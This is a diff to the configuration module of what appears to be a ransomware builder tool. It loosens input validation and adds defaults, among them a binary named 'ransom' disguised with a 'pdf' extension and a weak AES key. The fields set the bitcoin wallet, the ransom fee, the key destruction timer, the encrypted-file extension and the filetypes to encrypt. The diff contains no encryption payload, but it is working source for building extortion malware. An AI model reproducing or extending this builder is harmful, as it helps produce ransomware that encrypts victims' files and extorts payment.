@@ -53,7 +53,7 @@ ENCRYPTABLE_FILETYPES = [
 @note: To add a new field, adjust the GUI form appropriately and add the settings for the new
 field to this dictionary
 '''
-CONFIG_ITEMS = OrderedDict([
+BUILDER_CONFIG_ITEMS = OrderedDict([
     (
         "builder_language", {
             "label": "Builder Language",
@@ -75,7 +75,7 @@ CONFIG_ITEMS = OrderedDict([
             "example": "0 - Minimal",
             "input_requirement": "Build process debug level",
             "config_area": "Debug",
-            "default": "English"
+            "default": "1 - Low"
             }
     ),
     (
@@ -83,7 +83,7 @@ CONFIG_ITEMS = OrderedDict([
             "label": "Major Version",
             "label_object_name": "MajorVersionLabel",
             "input_object_name": "MajorVersionTextCtrl",
-            "regex": re.compile("^[0-9]+$"),
+            "regex": re.compile("^[0-9]*$"),
             "example": "5",
             "input_requirement": "A series of integer(s)",
             "config_area": "Version Information"
@@ -92,7 +92,7 @@ CONFIG_ITEMS = OrderedDict([
     (
         "min_version", {
             "label": "Minor Version",
-            "regex": re.compile("^[0-9]+$"),
+            "regex": re.compile("^[0-9]*$"),
             "label_object_name": "MinorVersionLabel",
             "input_object_name": "MinorVersionTextCtrl",
             "example": "20",
@@ -105,9 +105,10 @@ CONFIG_ITEMS = OrderedDict([
             "label": "Filename",
             "label_object_name": "FilenameLabel",
             "input_object_name": "FilenameTextCtrl",
-            "regex": re.compile("^[A-Za-z][A-Za-z0-9_-]*$"),
+            "regex": re.compile("^([A-Za-z][A-Za-z0-9_-]*)?$"),
             "input_requirement": "A series of alphanumeric character(s), beginning with a letter",
             "example": "invoice_pdf",
+            "default": "ransom",
             "config_area": "Binary Settings"
             }
     ),
@@ -116,9 +117,10 @@ CONFIG_ITEMS = OrderedDict([
             "label": "Extension",
             "label_object_name": "ExtensionLabel",
             "input_object_name": "ExtensionTextCtrl",
-            "regex": re.compile("^[A-Za-z0-9]+$"),
+            "regex": re.compile("^[A-Za-z0-9]*$"),
             "example": "pdf",
             "input_requirement": "A series of alphanumeric character(s)",
+            "default": "pdf",
             "config_area": "Binary Settings"
             }
     ),
@@ -127,9 +129,10 @@ CONFIG_ITEMS = OrderedDict([
             "label": "PyInstaller AES Key",
             "label_object_name": "PyinstallerAesKeyLabel",
             "input_object_name": "PyinstallerAesKeyTextCtrl",
-            "regex": re.compile("^[A-Za-z0-9]{32}$"),
+            "regex": re.compile("^([A-Za-z0-9]{32})?$"),
             "example": "093AC769F6557577452E9DB2C74B984A",
             "input_requirement": "A 32 byte(character) string of alphanumeric characters",
+            "default": "0123456789abcdef",
             "config_area": "Binary Settings"
             }
     ),
@@ -138,9 +141,10 @@ CONFIG_ITEMS = OrderedDict([
             "label": "Icon",
             "label_object_name": "IconLabel",
             "input_object_name": "IconFilePicker",
-            "regex": re.compile("^.+$"),
+            "regex": re.compile("^.*$"),
             "example": "C:\\Users\\test\\icon.ico",
             "input_requirement": "A file path pointing to the location of a valid .ico icon file",
+            "default": "",
             "config_area": "Binary Settings"
             }
     ),
@@ -149,7 +153,7 @@ CONFIG_ITEMS = OrderedDict([
             "label": "Encrypted File Extension",
             "label_object_name": "EncryptedFileExtensionLabel",
             "input_object_name": "EncryptedFileExtensionTextCtrl",
-            "regex": re.compile("^[A-Za-z0-9]+$"),
+            "regex": re.compile("^[A-Za-z0-9]*$"),
             "example": "locked",
             "input_requirement": "A series of alphanumeric character(s)",
             "config_area": "Ransomware Settings",
@@ -161,7 +165,7 @@ CONFIG_ITEMS = OrderedDict([
             "label": "Wallet Address",
             "label_object_name": "WalletAddressLabel",
             "input_object_name": "WalletAddressTextCtrl",
-            "regex": re.compile("^[A-Za-z0-9]{26,35}$"),
+            "regex": re.compile("^([A-Za-z0-9]{26,35})?$"),
             "example": "12mdKVNfAhLbRDLtRWQFhQgydgU6bUMjay",
             "input_requirement": "A bitcoin wallet address as a series of alphanumeric" 
                                  " characters (26-35 characters in length",
@@ -174,7 +178,7 @@ CONFIG_ITEMS = OrderedDict([
             "label": "Bitcoin Fee",
             "label_object_name": "BitcoinFeeLabel",
             "input_object_name": "BitcoinFeeTextCtrl",
-            "regex": re.compile("^[0-9]+(\.[0-9+]*)$"),
+            "regex": re.compile("^([0-9]+(\.[0-9+]*))?$"),
             "example": "0.0897",
             "input_requirement": "A valid integer or floating point number",
             "config_area": "Ransomware Settings",
@@ -186,7 +190,7 @@ CONFIG_ITEMS = OrderedDict([
             "label": "Key Destruction Time(s)",
             "label_object_name": "KeyDestructionTimeLabel",
             "input_object_name": "KeyDestructionTimeTextCtrl",
-            "regex": re.compile("^[0-9]+$"),
+            "regex": re.compile("^[0-9]*$"),
             "example": "259200",
             "input_requirement": "A valid integer or floating point number",
             "config_area": "Ransomware Settings",
@@ -198,7 +202,7 @@ CONFIG_ITEMS = OrderedDict([
             "label": "Max File Size to Encrypt",
             "label_object_name": "MaxFileSizeLabel",
             "input_object_name": "MaxFileSizeTextCtrl",
-            "regex": re.compile("^[0-9]+$"),
+            "regex": re.compile("^[0-9]*$"),
             "input_requirement": "A valid integer",
             "example": "512",
             "config_area": "Ransomware Settings",
@@ -210,7 +214,7 @@ CONFIG_ITEMS = OrderedDict([
             "label": "Filetypes to Encrypt",
             "label_object_name": "FiletypesToEncryptLabel",
             "input_object_name": "FiletypesToEncryptTextCtrl",
-            "regex": re.compile("^[A-Za-z0-9]+(,[A-Za-z0-9]+)*$"),
+            "regex": re.compile("^([A-Za-z0-9]+(,[A-Za-z0-9]+)*)?$"),
             "example": "pdf,exe,msi,doc",
             "input_requirement": "A comma-separated list of filetypes to encrypt",
             "config_area": "Ransomware Settings",
